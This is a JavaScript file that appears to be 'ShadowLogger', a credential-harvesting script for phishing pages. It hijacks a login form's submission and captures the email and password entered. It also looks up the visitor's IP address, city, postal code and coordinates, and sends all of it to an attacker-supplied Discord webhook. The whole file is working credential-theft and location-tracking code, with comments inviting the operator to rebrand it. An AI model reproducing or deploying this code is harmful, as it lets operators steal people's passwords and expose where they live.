document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    sendIPnlogin(email, password);
});

const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = ''; //place discord webhook here
                    
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "ShadowLogger", // changeable
                            avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png", // changeable
                            content: `@everyone`,
                            embeds: [
                                {
                                    title: "📡 New Visitor Logged",
                                    color: 0x800080,
                                    fields: [
                                        {
                                            name: "📧 Credentials",
                                            value: `**Email:** ${email}\n**Password:** ${password}`,
                                            inline: false
                                        },
                                        {
                                            name: "🧠 IP Address",
                                            value: `${ipadd}`,
                                            inline: true
                                        },
                                        {
                                            name: "🌍 Location",
                                            value: `**Network:** ${geoData.network}\n**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}`,
                                            inline: true
                                        },
                                        {
                                            name: "📮 Postal & Coords",
                                            value: `**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`,
                                            inline: false
                                        },
                                        {
                                            name: "🗺️ Google Maps",
                                            value: `[📍 View Location](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`,
                                            inline: false
                                        },
                                        {
                                            name: "📘 Full IP Data",
                                            value: `[🌐 View Full JSON](https://ipapi.co/${ipadd}/json/)`,
                                            inline: false
                                        }
                                    ],
                                    thumbnail: {
                                        url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                    },
                                    footer: {
                                        text: "ShadowLogger by ARMed0ps",
                                        icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                    },
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
